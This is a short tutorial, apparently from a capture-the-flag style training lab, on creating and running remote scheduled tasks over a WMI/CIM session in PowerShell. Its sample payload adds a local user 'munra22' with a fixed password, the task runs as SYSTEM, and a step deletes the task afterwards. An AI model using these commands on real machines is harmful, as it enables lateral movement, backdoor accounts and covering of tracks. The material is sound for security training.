To create and execute scheduled tasks remotely using PowerShell and WMI, follow these steps:

1. Assuming you have established a WMI session and stored it in the `$Session` variable, you can use the following commands to create a scheduled task:

```powershell
# Payload must be split into Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

# Define the task action
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args

# Register the scheduled task
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"

# Start the scheduled task
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Replace `$Command` and `$Args` with the desired command and arguments you want the scheduled task to execute. Adjust the `-User` parameter if you need to specify a different user for the task.

2. To delete the scheduled task after it has been used, use the following command:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Make sure to adjust the commands and parameters according to your specific scenario. The required ports for WMI communication are 135/TCP, 49152-65535/TCP (DCERPC), and either 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS). The user account used for creating and executing scheduled tasks remotely should have the necessary permissions, such as being a member of the Administrators group.